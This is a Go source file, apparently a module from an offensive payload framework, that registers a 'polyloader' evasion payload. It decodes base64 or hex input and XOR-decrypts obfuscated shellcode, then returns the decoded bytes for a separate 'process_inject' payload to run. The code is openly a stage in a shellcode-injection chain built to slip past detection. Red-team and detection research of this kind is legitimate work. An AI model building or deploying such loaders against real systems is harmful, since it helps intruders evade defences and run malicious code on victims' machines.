package payloads

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"time"
)

func init() {
	Register(&PolyLoader{})
}

type PolyLoader struct{}

func (p *PolyLoader) Name() string     { return "polyloader" }
func (p *PolyLoader) Category() string { return "evasion" }
func (p *PolyLoader) Description() string {
	return "Polymorphic XOR decode of obfuscated shellcode (feed decoded hex to process_inject)"
}

func (p *PolyLoader) Execute(args map[string]string) ([]byte, error) {
	shellcode := args["shellcode"]
	if shellcode == "" {
		return MarshalJSON(&polyResult{
			Timestamp: time.Now().UTC().Format(time.RFC3339),
			Error:     "shellcode argument required (base64/hex XOR-obfuscated)",
		})
	}
	key := args["key"]

	result := p.decode(shellcode, key)
	return MarshalJSON(result)
}

type polyResult struct {
	Timestamp   string `json:"timestamp"`
	Shellcode   string `json:"shellcode_b64"`
	Key         string `json:"key,omitempty"`
	DecodedHex  string `json:"decoded_hex,omitempty"`
	DecodedSize int    `json:"decoded_size,omitempty"`
	Error       string `json:"error,omitempty"`
}

// decode restores XOR-obfuscated shellcode. The result is the decoded byte
// sequence (hex) ready for process_inject; this module decodes and validates,
// it does not execute - execution is the process_inject payload's job.
func (p *PolyLoader) decode(shellcodeInput, key string) *polyResult {
	r := &polyResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Shellcode: shellcodeInput,
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(shellcodeInput)
	if err != nil {
		// Try base64 URL-safe
		data, err = base64.URLEncoding.DecodeString(shellcodeInput)
		if err != nil {
			// Try raw hex
			data, err = hex.DecodeString(shellcodeInput)
			if err != nil {
				r.Error = fmt.Sprintf("failed to decode shellcode: %v", err)
				return r
			}
		}
	}

	// XOR decrypt (no key => identity)
	if key != "" {
		r.Key = key
		keyBytes := []byte(key)
		decoded := make([]byte, len(data))
		for i, b := range data {
			decoded[i] = b ^ keyBytes[i%len(keyBytes)]
		}
		data = decoded
	}

	r.DecodedHex = hex.EncodeToString(data)
	r.DecodedSize = len(data)
	if r.DecodedSize == 0 {
		r.Error = "decoded shellcode is empty"
	}
	return r
}
